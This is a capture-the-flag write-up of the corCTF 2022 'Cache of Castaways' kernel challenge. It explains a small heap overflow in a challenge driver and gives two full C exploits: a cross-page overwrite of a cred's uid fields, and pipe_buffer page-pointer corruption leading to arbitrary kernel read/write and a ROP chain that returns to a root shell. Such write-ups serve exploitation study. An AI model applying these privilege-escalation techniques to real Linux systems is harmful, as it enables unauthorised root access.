---
title: "Limit Heap Overflow to Root with Cred (OOB Fengshui Crafting) /Pipe_buffer (Pipe Buffer AAR/AAW): Cache of Castaways (corCTF 2022)"
date: 2024-06-28 13:33:00
tags: 
layout: post
---

# 0x00 Introduction

To practice kernel exploitation, I plan to solve old CTF challenges and learn different skills from others. Before doing this challenge, I already knew about the cross-cache attack from [IPS][1]. However, when I applied the same method to this challenge, I found it difficult to perform cross-page when the target allocation was noisy. After reproducing the official write I exploited it with `pipe_buffer`.


- Heap Overflow
- Spray Creds
- OOB Fengshui Crafting
- `Pipe_buffer` AAR/AAW


# 0x01 Challenge

[Attachment][2]

This is a kernel challenge from corCTF 2022. 

You can also check the [write-up][3] from the challenge authors.

Reversing and bug discovery are trivial in this challenge. It's like the normal userspace heap challenges. There are two options to manipulate the kernel heap objects: `add` and `edit`. In `add` there is a simple 6 bytes heap overflow. 
Considering the size of objects (0x200) and `FREELIST_HARDENED`, we can't use a 6-byte overflow to modify freelist. Moreover, this challenge created a new `kmem_cache` so we have to do cross pape (it's called cross cache in the original write-up, but I prefer to call it cross page to show the difference between it and the UAF-cross-cache technique). Also, I have to mention that this challenge also applied `CONFIG_HARDENED_USERCOPY` which should disable the `cross-page` technique. However, this challenge first copied the data from userspace to the kernel stack and then copied it from the kernel stack to heap objects, which enabled the `cross-page` technique.

So we mainly have two ways to attack
- cross page overflow to modify metadata -> for example, `creds->uid`
- cross page to modify pointers to create -> for example, `seq_file->op->signle_start`

In the second way, we don't need a leak but a little brute force. I didn't try but I learned from @zolutal that kernel code is not very random.

# 0x02 Ideal Scenario

This challenge is easy! We have a vulnerable page next to a cred page. Then we use `edit` to overflow the first 6 bytes of cred then we become root!

Tip: Considering the first 4 bytes for creds is `usage` we'd better overwrite it with non-zero values. In practice, I would like to overwrite it with a large number, such as 0x132, since I found if we set it to 1/0, we may fail in some cases (e.g., when it's 1, we can't seteuid).

However, getting a scenario is not easy if we don't know how to set up better fengshui and avoid noise.

# 0x05 Exploitation


## 5.1 Page Holes Fengshui

If there is no noisy, it's easy to create one target page next to the vulnerable page. By the following code

```python
for x in range(0x200):
    alloc_page()
for x in range(0x200):
    if x%2==0:
        free_page(x)
spray_obj1()
for x in range(0x200):
  if x%2==1:
    free_page(x)
spray_obj2()
```

However, when it's noisy, it may not hit. There are two main ways to make it easier to happen: 
- Spray More
- Make it less noisy

## 5.2 Make it less noisy

Since the limit of allocation for both creds and vulnerable objects. We only have a window of about 0x40 pages. In the original write up, the author figured out a way to make it less noisy. 

```
#define CLONE_FLAG CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
```

Using the `CLONE_FLAG` above, we are able to make allocation less noisy:
```s
task_struct
kmalloc-64
vmap_area
vmap_area
cred_jar
signal_cache
pid
```

## 5.3 Details

After I reproduced the official solution with the value it provides, I got a root shell. But I was still confused about "how does the author get these numbers in the script?".


```c
int main(){
    // shell();
    libxInit();
    fd = open("/dev/castaway",2);
    // Step 1. Drain Creds
    // 200 is not enough and 800 is good. make sure you drain all the creds
    for(int i = 0 ; i < 800; i++)
        fork_sleep(); 
    // Step 2. Init the SockPageAllocator
    spaInit();
    // Step 3. Do page draining
    for (int i = 0; i < NR_PAGE_DRAINING; i++)
        spaCmd(ADD, i);
    // Step 4. Allocate contiguous pages
    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i++)
        spaCmd(ADD, i);
    // Step 5. Free & Refill
    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
        spaCmd(FREE, i);
    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
        add();
    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
        spaCmd(FREE, i+1);
    for(int i = 0 ; i < NR_CREDS; i++)
        cloneRoot();
    
    // Step 6. OOB Write
    char *buf = calloc(1,0x200);
    memset(buf+0x200-6,'\x00',4);
    memset(buf+0x200-2,'\x00',2);
    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
        edit(i,0x200,buf);
    debug();
    // Step 7. Wait for the rootShell
    info("Zz...");
    debug();
}

```

Based on the skills we talked about, we are able to generate the above exploit. However, how to set the numbers in the exploit to improve the success rate that we get the creds pages just after the `vulnerable page` where we can OOB write? 

```c
#define NR_PAGE_DRAINING ?
#define NR_CNT_PAGES ?
#define NR_VUl_TARGETS ?
#define NR_CREDS ?
```


First, if we want to improve the possibility of hitting, we'd better create as many as vulnerable pages as possible. so I set

```c
#define NR_VUl_TARGETS 0x1f8
```

Then, considering the limit of `clone` that the more we `clone` the slower the machine is, I set `NR_CREDS` to 0x40 which takes 2-3 seconds to finish creds spraying.


```c
#define NR_CREDS 0x40 
```

`NR_PAGE_DRAINING` is also easy to compute. I wrote a kernel module and kept allocating and printing the allocated page addresses. Then I found 0x200 should be a safe number to make sure we can get contiguous pages in the later page allocation.



```c
#define NR_PAGE_DRAINING 0x200
```


Then we have to consider how many contiguous pages should be used. Therefore, considering we have around 0x40 pages of OOB pages. To fill them we need 0x40 pages as the first half of the contiguous area. Therefore, we should set `NR_CNT_PAGES` to 0x80 and set `object1` to the `vulnerable object` to improve the success rate. If it's larger or smaller than 0x80, don't worry too much since if you used the pattern that:

- Free first half: 0,2,4,8 ...
- Spray Object 1
- Free the second half: 1,3,5,7...
- Spray Object 2


It's because both the sprayed objects will always be on the large index pages. Too small `NR_CNT_PAGES` make the attacking window too small while too large `NR_CNT_PAGES` may take a too long time and noise may influence more(in most cases, it'll be okay).

In the end, we have
```c
#define NR_PAGE_DRAINING 0x200
#define NR_CNT_PAGES 0x80
#define NR_VUl_TARGETS 0x1f8
#define NR_CREDS 0x40
```

# 0x06 Exploit: OOB to Creds

```c
// https://github.com/n132/libx
// gcc main.c -o ./main -lx -w
#include "libx.h"
#include <keyutils.h>

#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    int sk_skt[0x20][2];
    int pipe_fd[PIPE_NUM][2];
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
        initSocketArray(sk_skt);
        // initPipeBuffer(pipe_fd);
    }
    enum spray_cmd {
    ADD,
    FREE,
    EXIT,
    };
#endif // 
int fd = 0;
typedef struct node
{
    size_t idx;
    size_t size;
    char *ptr;
} node ;
void edit(size_t idx,size_t size, __u8 * payload){
    node pay;
    pay.idx  = idx;
    pay.size = size;
    pay.ptr  = calloc(0x200,1);
    memcpy(pay.ptr,payload,0x200);
    int res = ioctl(fd,0xF00DBABE,&pay);
};
void add(){int res = ioctl(fd,0xcafebabe,0);};

void fork_sleep(){
    if(fork())
        sleep(1000);
}

#define NR_PAGE_DRAINING 0x200
#define NR_CNT_PAGES 0x80
#define NR_VUl_TARGETS 0x1f8
#define NR_CREDS 0x40

int main(){
    // shell();
    libxInit();
    fd = open("/dev/castaway",2);
    // Step 1. Drain Creds
    for(int i = 0 ; i < 800; i++)
        fork_sleep();
    // Step 2. Init the SockPageAllocator
    spaInit();
    // Step 3. Do page draining
    for (int i = 0; i < NR_PAGE_DRAINING; i++)
        spaCmd(ADD, i);
    // Step 4. Allocate contiguous pages
    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i++)
        spaCmd(ADD, i);
    // Step 5. Free & Refill
    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
        spaCmd(FREE, i);
    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
        add();
    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
        spaCmd(FREE, i+1);
    for(int i = 0 ; i < NR_CREDS; i++)
        cloneRoot();
    
    // Step 6. OOB Write
    char *buf = calloc(1,0x200);
    memset(buf+0x200-6,'\x33',4);
    memset(buf+0x200-2,'\x00',2);
    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
        edit(i,0x200,buf);
    debug();
    // Step 7. Wait for the rootShell
    info("Zz...");
    debug();
}


```


# 0x07 Exploit: OOB to PipeBuffer

When I was struggling with the official write-up Fengshui, I exploited it in a way I am more familiar with: `PipeBuffer`.


Each page structure represents one page in the memory. We can get the virtual address of the corresponding page by doing math:
- Assuming we got a page address, `addr_page` 
- When there is no `KASLR`, `VMEMMAP_START == 0xffffea0000000000` and `page_off_base = 0xffff888000000000`
- It represents the page on `(addr_page-VMEMMAP_START)/sizeof(struct page)*PAGE_SIZE+page_off_base`


Therefore, changing the page structure in Pipebuffer means gaining Read/Write Access on another page:
- With several bytes overflow(theoretically, one byte is enough but in this challenge, we have 3 bytes), we are able to overwrite some important data (e.g., `PipeBuffer`'s Page Pionter)
- We have Read/Write Access on another page -> Leak / Hijack Control Flow
- This is not stable for some reason after you run one command. (I may not have time to figure it out recently).

```c
// https://github.com/n132/libx
// gcc main.c -o ./main -lx -w
#include "libx.h"

#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    int sk_skt[0x20][2];
    int pipe_fd[PIPE_NUM][2];
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
        // initSocketArray(sk_skt);
        initPipeBufferN(pipe_fd,0x100);
    }
    enum spray_cmd {
    ADD,
    FREE,
    EXIT,
    };
#endif // 
int fd = 0;
typedef struct node
{
    size_t idx;
    size_t size;
    char *ptr;
} node ;
void edit(size_t idx,size_t size, __u8 * payload){
    node pay;
    pay.idx  = idx;
    pay.size = size;
    pay.ptr  = calloc(0x200,1);
    memcpy(pay.ptr,payload,0x200);
    int res = ioctl(fd,0xF00DBABE,&pay);
    free(pay.ptr);
};
void add(){int res = ioctl(fd,0xcafebabe,0);};

void do_sleep(){
    sleep(1000);
}
void fork_sleep(){
    if(fork()){
        do_sleep();
        _exit(1);
    }
}
u64 bxx = 0;
u64 bxx1 =0;
u64 bxx2 =0;
void tainRegs(u64 base,u64 r1){
    bxx =r1;
    bxx1 = 0xffffffff812c28e3- NO_ASLR_BASE + base; 
    bxx2 = 0xffffffff8102bb46- NO_ASLR_BASE + base; 
    __asm__("mov rax, 0x9999999999999999;"
    "mov rbx, 0x9999999999999991;"
    "mov rcx, 0x9999999999999992;"
    "mov rdx, 0x9999999999999993;"
    "mov rdi, 0x9999999999999994;"
    "mov rsi, 0x9999999999999995;"
    "mov r8,  0x9999999999999996;"
    "mov r9,  0x9999999999999997;"
    "mov r10, 0x9999999999999998;"
    "mov r11, 0x9999999999999999;"
    "mov r12, 0x999999999999999a;"
    "mov r13, bxx1;"
    "mov r14, bxx;"
    "mov r15, bxx2;"
    "leave;"
    "ret;");
}

int main(){
    // shell();

    libxInit();
    
    fd = open("/dev/castaway",2);
    // Step 2. Init the SockPageAllocator
    spaInit();

    // Step 3. 0x2c77000
    for (int i = 0; i < 500; i++)
        spaCmd(ADD, i);
    for (int i = 500-40; i < 500; i += 2)
        spaCmd(FREE, i);
    for (int i = 0; i < 0x8*40; i++)
        add();
    for (int i = 501-40; i < 500; i += 2)
        spaCmd(FREE, i);
    for(int i = 0 ; i< 0x100 ;i++){
        pipeBufferResize(pipe_fd[i][0],8);
        pipeBufferResize(pipe_fd[i][1],8);
    }
    int fds[0x100]={0};
    for(int ii = 0 ; ii < 0x100; ii++){
        fds[ii] = open("/etc/passwd",0);
    }

    // Make sure we have enough space to walk through the 
    // Page list
    for(int i = 0 ; i < 0x100 ; i++){
        write(pipe_fd[i][1],dp('i',0x8000-0x800),0x8000-0x800);
    }
    // Step 4. Spray with target obj/creds
    // Step 5. OOB Write
    char *pay = calloc(1,0x200);
    size_t * ptr = pay ; 
    memset(pay,'\x99',0x200-6); // One byte off
    memset(pay+0x200-6,'\x00',1); // One byte off
    
    for(int i = 0 ; i <  0x8*40;i++)
        edit(i,0x200-6+1,pay);
    edit(0,0x200-6+1,pay);
    // Try to read 
    for(int i = 0 ; i < 0x100 ; i++){
        char buf[0x11]={0};
        read(pipe_fd[i][0],buf,0x11);
        size_t * tmp_ptr = buf;
        if(0x6675625f65706970==*tmp_ptr)
            continue;
        // printf("[%d]: %s\n",i,buf);
        {
            // Startswith 0x1c00 
            size_t starts = 0x3000;
            
            read(pipe_fd[i][0],buf,0x7);
            size_t acc = 0x18;
            for(int k = 0 ; k < 0x100 ; k++)
            {
                unsigned int  target_page = (k+starts)*0x40;
                unsigned int  *md = pay+0x200-6;
                *md = target_page;
                for(int j =0 ; j<0x8*40 ; j++)
                    edit(j,0x200-6+4,pay);
                memset(buf,0,0x11);
                if(acc%0x200==0)
                {
                    read(pipe_fd[i][0],buf,0x8);
                    acc += 8;
                }
                read(pipe_fd[i][0],buf,0x8);
                acc+=8;
                if(0x9999999999999999 == *tmp_ptr)
                {
                    printf("%p\n",target_page/0x40*0x1000+0xffff888000000000);
                    target_page+=0x40*0x50; //
                    *md = target_page;
                    for(int j =0 ; j<0x8*40 ; j++)
                        edit(j,0x200-6+4,pay);
                    char trash[0x8000] = {};
                    read(pipe_fd[i][0],trash,0x100-(acc%0x100));
                    char big_trash[0x1000]={};
                    char not_trash[0x300] = {};
                    read(pipe_fd[i][0],not_trash,0x100);
                    size_t cur_addr = *(size_t *)(not_trash+0x48);
                    size_t base = *(size_t *)(not_trash+0x28)-0x81f580;
                    success(hex(cur_addr));
                    int res = read(pipe_fd[i][0],big_trash,0x1000);

                    size_t poc = 0xffffffff8123eab0- NO_ASLR_BASE + base; 
                    size_t * ppp = not_trash+0x28;
                    *ppp = cur_addr-0x248+0x100;
                    size_t *rop = not_trash+0x100;
                    size_t ct = 0 ; 
                    for(int cc = 0 ; cc < 0x20; cc++)
                        rop[ct++]=poc;

                    rop[ct++]  = 0xffffffff812c89bd- NO_ASLR_BASE + base; 
                    rop[ct++]  = 0xffffffff81a50520- NO_ASLR_BASE + base; 
                    rop[ct++]  = 0xffffffff81066d20- NO_ASLR_BASE + base; 
                    rop[ct++]  = 0xffffffff81400cb0+22- NO_ASLR_BASE + base; 
                    rop[ct++]  = 0 ; 
                    rop[ct++]  = 0 ;
                    rop[ct++]  = shell;
                    rop[ct++]  = user_cs;
                    rop[ct++]  = user_rflags;
                    rop[ct++]  = user_sp;
                    rop[ct++]  = user_ss;


                    res = write(pipe_fd[i][1],&not_trash,0x300);
                    debug();
                    tainRegs(base,cur_addr-0x48-8);
                    for(int i = 0 ; i < 0x100 ; i++)
                        read(fds[i],trash,1);
                    break;
                }
            }
        }
        break;
    }
    
    // Step 6. Wait for the rootShell
    debug();
}
```

# 0x08 Epilogue

TODO:
- [Done] Figure out fengshui of the official solution 
- Figure out why it crashes after running arbitrary commands
- [Done] Learn more about page allocation

Learned:
- `pipe_buffer` aar/aaw
- cred spray
- page allocation spray


[1]: https://n132.github.io/2024/02/29/IPS-Cross-Slab-Attack.html
[2]: https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/cache-of-castaways
[3]: https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html
